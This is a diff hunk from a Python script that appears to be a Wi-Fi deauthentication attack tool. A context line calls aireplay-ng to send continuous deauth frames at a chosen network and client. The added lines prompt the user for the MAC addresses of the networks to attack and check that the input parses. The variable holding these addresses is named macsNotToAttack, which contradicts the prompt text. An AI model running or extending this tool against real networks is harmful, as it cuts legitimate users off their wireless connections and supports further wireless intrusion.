@@ -104,3 +104,19 @@ def deauthAttack(networkMac, targetMac, interface):
     subprocess.run(["aireplay-ng", "--deauth", "0", "-a", networkMac, "-c", targetMac, interface])
     
 macAddressRegex = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
+wlanCode = re.compile(r"Interface (wlan[0-9])")
+
+sudoCheck()
+backupCsv()
+
+macsNotToAttack = []
+
+while True:
+    print("Please enter the Mac Address of the network you want to attack")
+    mac = input("Please use comma to seperate the list of more than one macAddress: ")
+    macsNotToAttack = macAddressRegex.findall(mac)
+    macsNotToAttack = [mac.upper() for mac in macsNotToAttack]
+    if len(macsNotToAttack) > 0:
+        break
+    print("Invalid Mac Address")
+    
